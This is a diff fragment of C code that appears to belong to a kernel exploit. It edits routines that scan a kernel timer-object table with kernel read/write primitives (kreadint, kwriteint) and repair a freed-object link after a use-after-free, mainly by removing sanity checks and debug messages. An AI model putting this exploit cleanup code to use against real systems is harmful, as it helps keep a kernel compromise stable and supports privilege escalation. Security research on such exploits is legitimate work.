@@ -26,40 +26,27 @@
 #define TOBJ_IDX_TO_ADDR(idx)         ((u32)KTIMER_BASE + KTIMER_OBJECT_SIZE * (u32)(idx))
 
 static void *find_orphan() {
-
   bool reachable[NUM_TIMER_OBJECTS];
   memset(reachable, 0, NUM_TIMER_OBJECTS * sizeof(bool));
 
-  u32 i = 0;
   /* go through the timer table and find all reachable objects */
+  u32 i = 0;
   for (void *current_timer = KTIMER_BASE;
        current_timer < KTIMER_END;
        current_timer += KTIMER_OBJECT_SIZE, i++) {
     void *child = (void *)kreadint(current_timer);
 
-    if (TOBJ_ADDR_TO_IDX(current_timer) != i) {
-      printf("[!] Got TOBJ_ADDR_TO_IDX(current_timer) != i: 0x%lx != 0x%lx\n",
-             TOBJ_ADDR_TO_IDX(current_timer), i);
-      wait_for_user();
-    }
-
     if (IS_KERNEL_NON_SLAB_HEAP(child)) {
       /* object is allocated, therefore reachable */
-      reachable[TOBJ_ADDR_TO_IDX(current_timer)] = true;
+      reachable[i] = true;
     } else if (KTIMER_BASE <= child && child < KTIMER_END) {
       /* object is freed, next pointer is reachable */
       reachable[TOBJ_ADDR_TO_IDX(child)] = true;
     } else if (child != NULL && child != (void *)TIMER2_NEXT_KERNEL) {
-      printf("[!] Warning! Timer table entry had non-vtable, non-freed entry!\n");
+      printf("[!] Timer table entry had non-vtable, non-freed entry!\n");
       printf("It looks like this: %p -> %p\n", current_timer, child);
       wait_for_user();
     }
-  }
-
-  if (i != NUM_TIMER_OBJECTS) {
-    printf("[!] Unexpected number of iterations over timer object list.\n");
-    printf("[!] Got %lu, expected %lu.\n", i, NUM_TIMER_OBJECTS);
-    return NULL;
   }
 
   /* account for list head */
@@ -119,7 +106,6 @@ bool cleanup_uaf() {
   }
 
   printf("[+] Fixed link: %p -> %p\n", parent, orphan);
-
   kwriteint((u32 *)parent, (u32)orphan);
   return true;
 }
